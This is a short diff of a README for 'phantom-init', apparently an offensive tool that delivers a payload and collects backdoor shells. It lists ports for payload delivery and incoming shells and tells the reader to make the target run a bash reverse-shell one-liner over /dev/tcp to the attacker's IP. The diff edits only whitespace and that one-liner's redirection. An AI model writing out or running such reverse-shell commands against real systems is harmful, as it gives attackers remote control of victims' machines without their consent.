@@ -18,11 +18,11 @@ phantom-init  [ip=][port1=][port2=][portp=]
 
 * ip: the attacker's ip (e.g. ip=127.0.0.1)
 * port1: the port that listens for connections to deliver the payload (e.g. port1=8888)
-* port2: the port that listens for the backdoor shells after delivering the payload 
+* port2: the port that listens for the backdoor shells after delivering the payload
 * portp: the port that the python3 server listens to transfer the functions and variables needed by the payload
 
 You have to somehow make the target execute this code, so that he connects to port1:  
-**bash -c 'bash &>/dev/tcp/ip/port1 0>&1 &'**  
+**bash -c 'bash &>/dev/tcp/ip/port1 <&1 &'**  
 ip and port1 are the ones specified above.
 
 ## Files
